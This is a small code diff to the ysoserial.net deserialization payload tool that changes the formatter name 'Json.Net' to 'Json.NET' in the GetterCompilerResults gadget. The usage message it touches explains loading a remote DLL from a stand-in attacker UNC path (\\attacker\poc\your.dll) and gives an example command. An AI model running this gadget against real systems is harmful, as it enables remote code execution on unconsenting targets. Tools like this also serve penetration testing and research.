@@ -29,7 +29,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Json.Net"}; // MessagePack should work too
+            return new List<string> { "Json.NET"}; // MessagePack should work too
         }
 
         public override string Name()
@@ -78,7 +78,7 @@ namespace ysoserial.Generators
 
             if (!inputArgs.CmdFullString.ToLowerInvariant().EndsWith(".dll"))
             {
-                Console.WriteLine("This gadget loads remote (.NET 5/6/7) or local file (.NET Framework, if System.CodeDom is available): -c argument should provide a file path to your mixed DLL file, which needs to end with the \".dll\"\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nIf you want to deliver file with a different extension than .dll, please modify the gadget manually\r\nExample: ysoserial.exe -g GetterCompilerResults -f Json.Net -c '\\\\attacker\\poc\\your.dll'");
+                Console.WriteLine("This gadget loads remote (.NET 5/6/7) or local file (.NET Framework, if System.CodeDom is available): -c argument should provide a file path to your mixed DLL file, which needs to end with the \".dll\"\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nIf you want to deliver file with a different extension than .dll, please modify the gadget manually\r\nExample: ysoserial.exe -g GetterCompilerResults -f Json.NET -c '\\\\attacker\\poc\\your.dll'");
                 Environment.Exit(-1);
             }
 
